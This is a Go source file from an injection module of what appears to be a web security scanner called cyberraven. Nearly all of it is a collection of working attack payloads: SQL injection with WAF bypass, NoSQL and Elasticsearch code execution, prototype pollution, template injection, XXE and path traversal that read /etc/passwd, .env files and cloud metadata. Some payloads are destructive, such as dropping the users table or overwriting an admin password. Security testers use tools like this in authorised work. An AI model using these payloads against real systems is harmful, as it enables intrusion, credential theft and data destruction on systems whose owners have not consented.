package injection

import (
	"strings"

	"github.com/ajkula/cyberraven/pkg/discovery"
)

// getDefaultInjectionEndpoints returns systematic endpoint patterns
func getDefaultInjectionEndpoints() []string {
	return []string{
		// Authentication patterns (universal)
		"/login", "/auth", "/signin", "/authenticate",

		// Search patterns (data extraction targets)
		"/search", "/query", "/find", "/filter",

		// User management patterns (privilege escalation)
		"/user", "/users", "/profile", "/account", "/admin",

		// API patterns (modern attack surface)
		"/api/login", "/api/auth", "/api/users", "/api/search",
		"/api/user", "/api/data", "/api/query",
	}
}

// getIntelligentEndpoints uses discovery intelligence or falls back to systematic patterns
func getIntelligentEndpoints(discoveryCtx *discovery.AttackContext) []string {
	if discoveryCtx != nil && discoveryCtx.IsIntelligenceAvailable() {
		// Use discovered parameterized endpoints (high success rate)
		discoveredEndpoints := discoveryCtx.GetParameterizedEndpoints()
		if len(discoveredEndpoints) > 0 {
			endpoints := make([]string, 0, len(discoveredEndpoints))
			for _, endpoint := range discoveredEndpoints {
				endpoints = append(endpoints, endpoint.Path)
			}
			return endpoints
		}
	}

	// Fallback to systematic patterns
	return getDefaultInjectionEndpoints()
}

// getLimitedSQLPayloads returns modern SQL injection payloads with WAF bypass techniques
func getLimitedSQLPayloads() []string {
	return []string{
		// Modern WAF bypass - Case manipulation
		"' Or 1=1-- -",
		"' oR '1'='1'-- -",
		"' OR 1=1#",
		"' UnIoN SeLeCt null-- -",

		// Comment variation bypass
		"' OR 1=1/**/-- -",
		"' OR/**/1=1-- -",
		"'/**/OR/**/1=1-- -",
		"' OR 1=1--+-",
		"' OR 1=1--++",

		// Parentheses and quotes bypass
		"') OR ('1'='1'-- -",
		"\") OR (\"1\"=\"1\"-- -",
		"') OR (1=1)-- -",
		"\" OR \"1\"=\"1\"-- -",

		// Unicode and encoding bypass
		"'%20OR%201=1-- -",
		"'%0aOR%0a1=1-- -",
		"'%09OR%091=1-- -",
		"'%0dOR%0d1=1-- -",

		// Modern UNION techniques
		"' UNION/*!00000*/SELECT null-- -",
		"' /*!50000UNION*/ SELECT null-- -",
		"' UNION ALL SELECT null,null-- -",
		"' UNION DISTINCT SELECT null,null-- -",

		// Time-based blind (multi-database)
		"' AND (SELECT*FROM(SELECT(SLEEP(5)))a)-- -",
		"' AND (SELECT COUNT(*)FROM(SELECT(SLEEP(5)))a)-- -",
		"' OR (SELECT*FROM(SELECT(SLEEP(5)))a)-- -",
		"' WAITFOR DELAY '0:0:5'-- -",
		"' AND pg_sleep(5)-- -",

		// Boolean-based blind advanced
		"' AND (SELECT SUBSTRING(@@version,1,1))='5'-- -",
		"' AND (SELECT ASCII(SUBSTRING(user(),1,1)))>64-- -",
		"' AND (SELECT LENGTH(database()))>0-- -",
		"' AND (SELECT COUNT(*)FROM information_schema.tables)>0-- -",

		// Error-based advanced
		"' AND (SELECT*FROM(SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
		"' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))-- -",
		"' AND (SELECT*FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",

		// Second-order injection
		"admin'; INSERT INTO users VALUES('hacker','pass')-- -",
		"user'; UPDATE users SET password='hacked' WHERE username='admin'-- -",
	}
}

// getLimitedNoSQLPayloads returns modern NoSQL injection payloads
func getLimitedNoSQLPayloads() []string {
	return []string{
		// MongoDB advanced operators
		`{"$where": "function(){return true}"}`,
		`{"$where": "this.username.match(/.*/) && this.password.match(/.*/)"})`,
		`{"$where": "Object.keys(this).length > 0"}`,
		`{"$where": "this.constructor.constructor('return process.env')()"}`,

		// MongoDB aggregation bypass
		`{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "result"}}`,
		`{"$facet": {"a": [{"$match": {}}]}}`,
		`{"$graphLookup": {"from": "users", "startWith": "$_id", "connectFromField": "_id", "connectToField": "_id", "as": "result"}}`,

		// Advanced regex bypass
		`{"username": {"$regex": "^admin", "$options": "i"}}`,
		`{"password": {"$regex": ".*", "$options": "s"}}`,
		`{"$or": [{"username": {"$regex": "admin"}}, {"username": {"$regex": "administrator"}}]}`,

		// Type confusion
		`{"username": {"$type": 2}}`,
		`{"password": {"$type": "string"}}`,
		`{"$where": "this.username.constructor.constructor('return process')()"}`,

		// Injection in aggregation
		`[{"$match": {"$expr": {"$function": {"body": "function() { return true; }", "args": [], "lang": "js"}}}}]`,
		`[{"$addFields": {"result": {"$function": {"body": "function() { return db.users.find(); }", "args": [], "lang": "js"}}}}]`,

		// Time-based for MongoDB
		`{"$where": "sleep(3000) || true"}`,
		`{"$where": "this.username.match(/.*/) && sleep(3000)"}`,
		`{"$expr": {"$function": {"body": "function() { sleep(3000); return true; }", "args": [], "lang": "js"}}}`,

		// Elasticsearch injection
		`{"query": {"script": {"source": "doc['username'].value.length() > 0"}}}`,
		`{"query": {"script": {"source": "Math.class.forName('java.lang.Runtime').getRuntime().exec('whoami')"}}}`,
	}
}

// getLimitedJSONPayloads returns modern JSON injection payloads
func getLimitedJSONPayloads() []string {
	return []string{
		// Prototype pollution variations
		`{"__proto__": {"admin": true}}`,
		`{"constructor": {"prototype": {"admin": true}}}`,
		`{"__proto__": {"role": "administrator"}}`,
		`{"__proto__": {"isAdmin": true}}`,

		// Advanced prototype pollution
		`{"__proto__": {"toString": "admin"}}`,
		`{"__proto__": {"valueOf": "admin"}}`,
		`{"constructor": {"prototype": {"toString": function() { return true; }}}}`,

		// GraphQL injection
		`{"query": "query { users { id username password } }"}`,
		`{"query": "mutation { createUser(username: \"admin\", password: \"hacked\") { id } }"}`,
		`{"query": "query { __schema { types { name } } }"}`,
		`{"query": "query { __type(name: \"User\") { fields { name } } }"}`,

		// SQL injection in JSON values (modern)
		`{"search": "' UNION SELECT username,password FROM users WHERE '1'='1"}`,
		`{"query": "' OR (SELECT COUNT(*) FROM users) > 0-- -"}`,
		`{"filter": "' AND (SELECT SLEEP(5))-- -"}`,
		`{"sort": "' UNION SELECT @@version-- -"}`,

		// JWT claims manipulation
		`{"sub": "admin", "role": "administrator", "exp": 9999999999}`,
		`{"user": "admin", "admin": true, "iat": 1234567890}`,
		`{"username": "admin", "permissions": ["read", "write", "admin"]}`,

		// Type confusion attacks
		`{"id": [1, 2, 3]}`,
		`{"amount": {"$ne": null}}`,
		`{"price": [0, -1]}`,
		`{"role": {"admin": true}}`,

		// Template injection in JSON
		`{"name": "{{7*7}}"}`,
		`{"template": "{{config.items()}}"}`,
		`{"message": "{{''.__class__.__mro__[2].__subclasses__()}}"}`,
		`{"content": "{{''.join(request.environ.items())}}"}`,

		// LDAP injection in JSON
		`{"username": "admin)(&", "password": "any"}`,
		`{"filter": "(&(objectClass=user)(cn=*))"}`,
		`{"search": "admin)|(objectClass=*)"}`,

		// XML XXE in JSON (when parsed as XML)
		`{"xml": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"}`,
		`{"data": "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>"}`,
	}
}

// getLimitedPathPayloads returns modern path traversal payloads with encoding
func getLimitedPathPayloads() []string {
	return []string{
		// Modern encoding bypass
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",

		// Unicode bypass
		"..%u002f..%u002f..%u002fetc%u002fpasswd",
		"..%u2215..%u2215..%u2215etc%u2215passwd",
		"..%uFF0F..%uFF0F..%uFF0Fetc%uFF0Fpasswd",

		// Filter bypass techniques
		"....//....//....//etc//passwd",
		"...\\/...\\/...\\/etc\\/passwd",
		"..././..././..././etc/passwd",
		"...\x2f...\x2f...\x2fetc\x2fpasswd",

		// Windows specific modern
		"..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts",
		"..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
		"..%252f..%252f..%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts",

		// Container escape
		"..%2f..%2f..%2fproc%2fself%2fenviron",
		"..%2f..%2f..%2fproc%2fversion",
		"..%2f..%2f..%2fproc%2fself%2fcmdline",
		"..%2f..%2f..%2fproc%2fself%2fmounts",

		// Application config files
		"..%2f..%2f..%2f.env",
		"..%2f..%2f..%2fconfig.json",
		"..%2f..%2f..%2fapplication.properties",
		"..%2f..%2f..%2fweb.xml",
		"..%2f..%2f..%2fpackage.json",

		// Cloud metadata
		"..%2f..%2f..%2fproc%2fself%2fenviron",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",

		// Null byte bypass (legacy but still works)
		"..%2f..%2f..%2fetc%2fpasswd%00",
		"..%2f..%2f..%2fetc%2fpasswd%00.jpg",
		"..%2f..%2f..%2fetc%2fpasswd%00.txt",

		// Length bypass
		"..%2f" + strings.Repeat("A", 1000) + "%2f..%2f..%2fetc%2fpasswd",
		"..%2f..%2f..%2f" + strings.Repeat("B", 500) + "%2f..%2fetc%2fpasswd",
	}
}

// getContextualPayloads generates modern contextual payloads based on endpoint and parameter
func getContextualPayloads(endpoint, parameter string) []string {
	contextPayloads := []string{}

	endpointLower := strings.ToLower(endpoint)
	parameterLower := strings.ToLower(parameter)

	// Authentication context - modern bypass techniques
	if strings.Contains(endpointLower, "login") ||
		strings.Contains(endpointLower, "auth") ||
		strings.Contains(parameterLower, "user") ||
		strings.Contains(parameterLower, "pass") {
		contextPayloads = append(contextPayloads, []string{
			"admin'/**/Or/**/'1'='1'-- -",
			"administrator'/**/OR/**/'a'='a'-- -",
			"' OR EXISTS(SELECT*FROM users WHERE username='admin')-- -",
			"' OR (SELECT COUNT(*)FROM users)>0-- -",
			"' OR user()='root'-- -",
			"admin'; DROP TABLE users-- -",
		}...)
	}

	// Search context - modern data extraction
	if strings.Contains(endpointLower, "search") ||
		strings.Contains(endpointLower, "query") ||
		strings.Contains(parameterLower, "search") ||
		strings.Contains(parameterLower, "query") {
		contextPayloads = append(contextPayloads, []string{
			"' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users-- -",
			"' UNION SELECT username,password,email FROM users-- -",
			"' UNION SELECT@@version,@@datadir,user()-- -",
			"' AND (SELECT*FROM(SELECT(SLEEP(5)))a)-- -",
			"' OR (SELECT COUNT(*)FROM information_schema.tables)>0-- -",
		}...)
	}

	// ID context - modern UNION techniques
	if strings.Contains(parameterLower, "id") ||
		strings.Contains(parameterLower, "userid") ||
		strings.Contains(parameterLower, "user_id") {
		contextPayloads = append(contextPayloads, []string{
			"1' UNION SELECT null,username,password FROM users-- -",
			"1 UNION SELECT@@version,@@datadir,user()-- -",
			"1' AND (SELECT COUNT(*)FROM users)>0-- -",
			"1' AND (SELECT*FROM(SELECT(SLEEP(5)))a)-- -",
			"1' OR (SELECT ASCII(SUBSTRING(user(),1,1)))>64-- -",
		}...)
	}

	// File context - modern traversal
	if strings.Contains(parameterLower, "file") ||
		strings.Contains(parameterLower, "path") ||
		strings.Contains(parameterLower, "document") {
		contextPayloads = append(contextPayloads, []string{
			"..%2f..%2f..%2fetc%2fpasswd",
			"..%252f..%252f..%252fetc%252fpasswd",
			"..%2f..%2f..%2fproc%2fself%2fenviron",
			"..%2f..%2f..%2f.env",
			"..%2f..%2f..%2fconfig.json",
		}...)
	}

	// API context - modern API attacks
	if strings.Contains(endpointLower, "api") ||
		strings.Contains(endpointLower, "rest") ||
		strings.Contains(endpointLower, "graphql") {
		contextPayloads = append(contextPayloads, []string{
			`{"username": "admin", "password": "' OR 1=1-- -"}`,
			`{"$where": "this.username.match(/admin/)"}`,
			`{"__proto__": {"admin": true}}`,
			`{"query": "query { users { password } }"}`,
		}...)
	}

	return contextPayloads
}

// getAdaptivePayloads generates modern payloads based on discovered technology stack
func getAdaptivePayloads(discoveryCtx *discovery.AttackContext) map[string][]string {
	adaptivePayloads := make(map[string][]string)

	if discoveryCtx == nil {
		return adaptivePayloads
	}

	tech := discoveryCtx.Technology

	// Database-specific modern techniques
	switch strings.ToLower(tech.Database) {
	case "mysql":
		adaptivePayloads["sql"] = []string{
			"' AND (SELECT*FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
			"' AND (SELECT*FROM(SELECT(SLEEP(5)))a)-- -",
			"' UNION SELECT@@version,@@datadir,user()-- -",
			"' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))-- -",
			"' AND (SELECT COUNT(*)FROM information_schema.tables)>0-- -",
		}
	case "postgresql", "postgres":
		adaptivePayloads["sql"] = []string{
			"' AND (SELECT version())::text>'0'-- -",
			"' AND pg_sleep(5)-- -",
			"' UNION SELECT version(),current_user,current_database()-- -",
			"' AND (SELECT COUNT(*)FROM pg_tables)>0-- -",
			"' AND CAST(user AS int)-- -",
		}
	case "sqlite":
		adaptivePayloads["sql"] = []string{
			"' AND sqlite_version()>''-- -",
			"' UNION SELECT sqlite_version(),name,sql FROM sqlite_master-- -",
			"' AND (SELECT COUNT(*)FROM sqlite_master)>0-- -",
			"' AND (SELECT name FROM sqlite_master WHERE type='table')>''-- -",
		}
	case "mongodb":
		adaptivePayloads["nosql"] = []string{
			`{"$where": "this.username.constructor.constructor('return process.env')()"}`,
			`{"$where": "this.constructor.constructor('return db.users.find()')()"}`,
			`{"$expr": {"$function": {"body": "function() { return db.users.find(); }", "args": [], "lang": "js"}}}`,
		}
	}

	// Framework-specific modern techniques
	switch strings.ToLower(tech.Framework) {
	case "express", "node":
		adaptivePayloads["nosql"] = []string{
			`{"__proto__": {"admin": true}}`,
			`{"constructor": {"prototype": {"admin": true}}}`,
			`{"$where": "this.constructor.constructor('return process.env')()"}`,
		}
		adaptivePayloads["json"] = []string{
			`{"__proto__": {"role": "admin"}}`,
			`{"constructor": {"prototype": {"isAdmin": true}}}`,
		}
	case "django":
		adaptivePayloads["sql"] = []string{
			"' AND (SELECT COUNT(*)FROM django_session)>0-- -",
			"' UNION SELECT username,password,email FROM auth_user-- -",
			"' AND (SELECT is_superuser FROM auth_user WHERE username='admin')=1-- -",
		}
	case "spring":
		adaptivePayloads["sql"] = []string{
			"'; SELECT * FROM information_schema.tables-- -",
			"' AND (SELECT COUNT(*)FROM information_schema.tables WHERE table_schema=database())>0-- -",
			"' UNION SELECT table_name,column_name,data_type FROM information_schema.columns-- -",
		}
	case "rails":
		adaptivePayloads["sql"] = []string{
			"' AND (SELECT COUNT(*)FROM schema_migrations)>0-- -",
			"' UNION SELECT name,email,encrypted_password FROM users-- -",
		}
	}

	// Web server specific
	switch strings.ToLower(tech.WebServer) {
	case "nginx":
		adaptivePayloads["path"] = []string{
			"..%2f..%2f..%2fetc%2fnginx%2fnginx.conf",
			"..%2f..%2f..%2fvar%2flog%2fnginx%2faccess.log",
		}
	case "apache":
		adaptivePayloads["path"] = []string{
			"..%2f..%2f..%2fetc%2fapache2%2fapache2.conf",
			"..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log",
		}
	}

	return adaptivePayloads
}
